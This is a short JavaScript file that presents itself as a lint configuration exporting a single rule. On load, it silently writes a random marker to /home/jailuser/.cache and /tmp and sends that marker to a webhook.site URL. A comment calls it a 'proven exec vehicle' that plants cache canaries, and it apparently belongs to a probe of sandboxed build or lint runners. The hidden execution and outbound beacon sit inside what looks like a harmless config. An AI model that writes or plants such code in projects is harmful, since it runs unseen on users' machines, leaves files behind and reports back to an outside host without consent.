// RUNNERSINKS: proven exec vehicle — plants lineage cache canaries for leg B.
const fs = require("fs"), crypto = require("crypto"), https = require("https");
const MK = "RSNK_29DBD6_CARRY_PRISMA_" + crypto.randomBytes(3).toString("hex");
try { fs.mkdirSync("/home/jailuser/.cache/rsnk", { recursive: true }); } catch (e) {}
try { fs.writeFileSync("/home/jailuser/.cache/rsnk/carry_prisma.txt", MK); } catch (e) {}
try { fs.writeFileSync("/tmp/rsnk_carry_prisma.txt", MK); } catch (e) {}
try { https.get("https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-prisma-plant?d=" + encodeURIComponent(MK), (r) => r.resume()).on("error", () => {}); } catch (e) {}
module.exports = { rules: { ["rsnk-unknown-rule-" + MK.slice(-6)]: "error" } };
